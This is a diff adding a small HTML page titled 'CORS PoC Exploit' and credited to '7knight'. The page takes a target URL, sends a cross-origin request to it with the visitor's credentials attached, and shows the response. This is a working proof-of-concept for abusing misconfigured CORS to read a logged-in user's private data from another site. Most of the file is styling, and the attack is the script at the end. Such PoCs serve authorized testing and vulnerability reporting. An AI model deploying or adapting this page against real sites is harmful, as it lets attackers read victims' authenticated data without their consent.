@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS PoC Exploit</title>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        text-align: center;
+      }
+      input {
+        width: 80%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+      }
+      button {
+        padding: 10px 20px;
+        border: none;
+        background-color: #007bff;
+        color: white;
+        cursor: pointer;
+        border-radius: 4px;
+      }
+      button:hover {
+        background-color: #0056b3;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>CORS PoC Exploit</h1>
+    <h2>Exploited by 7knight</h2>
+    <h3>Show full page context</h3>
+    <input type="text" id="urlInput" placeholder="Enter URL" />
+    <button id="btn">Exploit</button>
+    <script>
+      document.getElementById('btn').addEventListener('click', function() {
+        var url = document.getElementById('urlInput').value;
+        if (url) {
+          var req = new XMLHttpRequest();
+          req.onload = function() {
+            alert(req.responseText);
+          };
+          req.open('get', url, true);
+          req.withCredentials = true;
+          req.send();
+        } else {
+          alert('Please enter a URL');
+        }
+      });
+    </script>
+  </body>
+</html>
